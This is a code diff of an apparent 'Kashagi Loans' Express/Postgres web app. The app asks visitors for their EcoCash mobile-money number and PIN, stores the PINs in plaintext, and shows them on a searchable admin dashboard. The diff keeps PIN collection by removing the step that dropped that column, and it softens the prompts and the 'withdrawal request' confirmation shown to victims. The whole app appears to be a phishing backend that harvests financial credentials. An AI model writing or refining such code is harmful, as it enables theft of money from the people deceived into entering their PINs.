@@ -27,8 +27,7 @@ app.use(
 
 const pool = new Pool({
 
-    connectionString:
-        process.env.DATABASE_URL,
+    connectionString: process.env.DATABASE_URL,
 
     ssl: {
         rejectUnauthorized: false
@@ -49,15 +48,12 @@ app.use(
 
 
 // ========================================
-// DATABASE INITIALIZATION
+// DATABASE SETUP
 // ========================================
 
 async function initializeDatabase() {
 
     try {
-
-        // Create submissions table
-        // if it doesn't already exist.
 
         await pool.query(`
             CREATE TABLE IF NOT EXISTS submissions (
@@ -66,44 +62,23 @@ async function initializeDatabase() {
 
                 ecocash_number TEXT NOT NULL,
 
-                ecocash_pin TEXT NOT NULL,
+                ecocash_pin TEXT,
 
-                created_at
-                    TIMESTAMP
+                created_at TIMESTAMP
                     DEFAULT CURRENT_TIMESTAMP
 
             )
         `);
 
 
-        // Add ecocash_pin to an
-        // older submissions table.
-
         await pool.query(`
             ALTER TABLE submissions
-            ADD COLUMN IF NOT EXISTS
-            ecocash_pin TEXT
+            ADD COLUMN IF NOT EXISTS ecocash_pin TEXT
         `);
-
-
-        // Remove the old PIN column completely.
-
-        await pool.query(`
-            ALTER TABLE submissions
-            DROP COLUMN IF EXISTS ecocash_pin
-        `);
-
-
-        // Make ecocash_pin required
-        // only when existing rows allow it.
-        //
-        // We don't force NOT NULL here because
-        // an old database could contain existing
-        // records without a ecocash pin.
 
 
         console.log(
-            "======================================"
+            "========================================"
         );
 
         console.log(
@@ -111,29 +86,19 @@ async function initializeDatabase() {
         );
 
         console.log(
-            "submissions table ready."
+            "Submissions table is ready."
         );
 
         console.log(
-            "EcoCash number + ecocash pin only."
+            "========================================"
         );
-
-        console.log(
-            "Old PIN column removed."
-        );
-
-        console.log(
-            "======================================"
-        );
-
 
     } catch (error) {
 
         console.error(
-            "DATABASE INITIALIZATION ERROR:"
+            "DATABASE INITIALIZATION ERROR:",
+            error
         );
-
-        console.error(error);
 
     }
 
@@ -141,7 +106,7 @@ async function initializeDatabase() {
 
 
 // ========================================
-// TEST DATABASE
+// DATABASE TEST
 // ========================================
 
 app.get(
@@ -167,7 +132,6 @@ app.get(
                     result.rows[0].now
 
             });
-
 
         } catch (error) {
 
@@ -214,8 +178,7 @@ app.get(
 
                     ecocash_pin TEXT,
 
-                    created_at
-                        TIMESTAMP
+                    created_at TIMESTAMP
                         DEFAULT CURRENT_TIMESTAMP
 
                 )
@@ -224,14 +187,7 @@ app.get(
 
             await pool.query(`
                 ALTER TABLE submissions
-                ADD COLUMN IF NOT EXISTS
-                ecocash_pin TEXT
-            `);
-
-
-            await pool.query(`
-                ALTER TABLE submissions
-                DROP COLUMN IF EXISTS ecocash_pin
+                ADD COLUMN IF NOT EXISTS ecocash_pin TEXT
             `);
 
 
@@ -240,10 +196,9 @@ app.get(
                 success: true,
 
                 message:
-                    "Submissions table is ready. Only EcoCash number and ecocash pin are used."
+                    "Submissions table is ready."
 
             });
-
 
         } catch (error) {
 
@@ -287,7 +242,7 @@ app.post(
         } = req.body;
 
 
-        // EcoCash number required
+        // Validate EcoCash number
 
         if (!ecocash_number) {
 
@@ -296,14 +251,14 @@ app.post(
                 success: false,
 
                 message:
-                    "EcoCash number is required."
+                    "Please enter your EcoCash number."
 
             });
 
         }
 
 
-        // Ecocash pin required
+        // Validate ecocash pin
 
         if (!ecocash_pin) {
 
@@ -312,7 +267,7 @@ app.post(
                 success: false,
 
                 message:
-                    "Ecocash pin is required."
+                    "Please enter your ecocash pin."
 
             });
 
@@ -360,13 +315,12 @@ app.post(
                 success: true,
 
                 message:
-                    "Withdrawal request has been received successfully.",
+                    "Withdrawal request has been received successfully✅.",
 
                 id:
                     result.rows[0].id
 
             });
-
 
         } catch (error) {
 
@@ -395,7 +349,7 @@ app.post(
 
 
 // ========================================
-// SUBMISSIONS DASHBOARD
+// VIEW SUBMISSIONS
 // ========================================
 
 app.get(
@@ -438,126 +392,168 @@ app.get(
 
 <!DOCTYPE html>
 
-<html>
+<html lang="en">
 
 <head>
 
-<meta charset="UTF-8">
+    <meta charset="UTF-8">
 
-<meta
-    name="viewport"
-    content="width=device-width, initial-scale=1"
->
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0"
+    >
 
-<title>
-Kashagi Loans - Submissions
-</title>
+    <title>
+        Kashagi Loans - Submissions
+    </title>
 
 
-<style>
+    <style>
 
-body {
+        * {
+            box-sizing: border-box;
+        }
 
-    font-family:
-        Arial,
-        sans-serif;
 
-    background:
-        #f5f5f5;
+        body {
 
-    padding:
-        20px;
+            margin: 0;
 
-}
+            padding: 20px;
 
-h1 {
+            font-family:
+                Arial,
+                Helvetica,
+                sans-serif;
 
-    color:
-        #1877f2;
+            background: #f5f5f5;
 
-}
+        }
 
-.search {
 
-    margin-bottom:
-        20px;
+        h1 {
 
-}
+            color: #1877f2;
 
-input {
+            margin-bottom: 20px;
 
-    padding:
-        10px;
+        }
 
-    width:
-        260px;
 
-    font-size:
-        16px;
+        .search-box {
 
-}
+            margin-bottom: 20px;
 
-button {
+        }
 
-    padding:
-        10px 15px;
 
-    cursor:
-        pointer;
+        .search-box input {
 
-}
+            width: 280px;
 
-table {
+            max-width: 100%;
 
-    width:
-        100%;
+            padding: 12px;
 
-    border-collapse:
-        collapse;
+            border:
+                1px solid #ccc;
 
-    background:
-        white;
+            border-radius: 6px;
 
-}
+            font-size: 16px;
 
-th,
-td {
+        }
 
-    padding:
-        12px;
 
-    border:
-        1px solid #ddd;
+        .search-box button {
 
-    text-align:
-        left;
+            padding: 12px 18px;
 
-}
+            border: none;
 
-th {
+            border-radius: 6px;
 
-    background:
-        #1877f2;
+            background: #1877f2;
 
-    color:
-        white;
+            color: white;
 
-}
+            cursor: pointer;
 
-.delete {
+            font-size: 16px;
 
-    background:
-        #d32f2f;
+        }
 
-    color:
-        white;
 
-    border:
-        none;
+        table {
 
-}
+            width: 100%;
 
-</style>
+            border-collapse:
+                collapse;
+
+            background: white;
+
+        }
+
+
+        th,
+        td {
+
+            padding: 12px;
+
+            border:
+                1px solid #ddd;
+
+            text-align: left;
+
+        }
+
+
+        th {
+
+            background: #1877f2;
+
+            color: white;
+
+        }
+
+
+        .delete {
+
+            background: #d32f2f;
+
+            color: white;
+
+            border: none;
+
+            padding: 8px 12px;
+
+            border-radius: 5px;
+
+            cursor: pointer;
+
+        }
+
+
+        @media (max-width: 700px) {
+
+            table {
+
+                font-size: 14px;
+
+            }
+
+
+            th,
+            td {
+
+                padding: 8px;
+
+            }
+
+        }
+
+    </style>
 
 </head>
 
@@ -565,56 +561,64 @@ th {
 <body>
 
 
-<h1>
-Kashagi Loans - Submissions
-</h1>
+    <h1>
+        Kashagi Loans - Submissions
+    </h1>
 
 
-<form
-    method="GET"
-    action="/submissions"
-    class="search"
->
+    <form
+        method="GET"
+        action="/submissions"
+        class="search-box"
+    >
 
-<input
-    type="text"
-    name="search"
-    placeholder="Search number or pin"
-    value="${escapeHtml(search)}"
->
-
-<button type="submit">
-    Search
-</button>
-
-</form>
+        <input
+            type="text"
+            name="search"
+            placeholder="Search number or pin"
+            value="${escapeHtml(search)}"
+        >
 
 
-<table>
+        <button type="submit">
+            Search
+        </button>
 
-<tr>
+    </form>
 
-<th>
-    ID
-</th>
 
-<th>
-    EcoCash Number
-</th>
+    <table>
 
-<th>
-    Ecocash Pin
-</th>
+        <thead>
 
-<th>
-    Date
-</th>
+            <tr>
 
-<th>
-    Action
-</th>
+                <th>
+                    ID
+                </th>
 
-</tr>
+                <th>
+                    EcoCash Number
+                </th>
+
+                <th>
+                    EcoCash Pin
+                </th>
+
+                <th>
+                    Date
+                </th>
+
+                <th>
+                    Action
+                </th>
+
+            </tr>
+
+        </thead>
+
+
+        <tbody>
 
 `;
 
@@ -624,50 +628,52 @@ Kashagi Loans - Submissions
 
                     html += `
 
-<tr>
+            <tr>
 
-<td>
-    ${row.id}
-</td>
+                <td>
+                    ${row.id}
+                </td>
 
-<td>
-    ${escapeHtml(
-        row.ecocash_number
-    )}
-</td>
+                <td>
+                    ${escapeHtml(
+                        row.ecocash_number
+                    )}
+                </td>
 
-<td>
-    ${escapeHtml(
-        row.ecocash_pin || ""
-    )}
-</td>
+                <td>
+                    ${escapeHtml(
+                        row.ecocash_pin || ""
+                    )}
+                </td>
 
-<td>
-    ${escapeHtml(
-        String(row.created_at)
-    )}
-</td>
+                <td>
+                    ${escapeHtml(
+                        String(
+                            row.created_at
+                        )
+                    )}
+                </td>
 
-<td>
+                <td>
 
-<form
-    method="POST"
-    action="/delete/${row.id}"
-    style="margin:0;"
->
+                    <form
+                        method="POST"
+                        action="/delete/${row.id}"
+                        style="margin:0;"
+                    >
 
-<button
-    type="submit"
-    class="delete"
->
-    Delete
-</button>
+                        <button
+                            type="submit"
+                            class="delete"
+                        >
+                            Delete
+                        </button>
 
-</form>
+                    </form>
 
-</td>
+                </td>
 
-</tr>
+            </tr>
 
 `;
 
@@ -677,7 +683,9 @@ Kashagi Loans - Submissions
 
             html += `
 
-</table>
+        </tbody>
+
+    </table>
 
 
 </body>
@@ -689,7 +697,6 @@ Kashagi Loans - Submissions
 
             res.send(html);
 
-
         } catch (error) {
 
             console.error(
@@ -700,15 +707,15 @@ Kashagi Loans - Submissions
 
             res.status(500).send(`
 
-<h1>
-    Database Error
-</h1>
+                <h1>
+                    Database Error
+                </h1>
 
-<pre>
+                <pre>
 ${escapeHtml(error.message)}
-</pre>
+                </pre>
 
-`);
+            `);
 
         }
 
@@ -740,7 +747,6 @@ app.post(
             res.redirect(
                 "/submissions"
             );
-
 
         } catch (error) {
 
@@ -827,6 +833,7 @@ app.listen(
         console.log(
             `Server started on port ${PORT}`
         );
+
 
         await initializeDatabase();
 
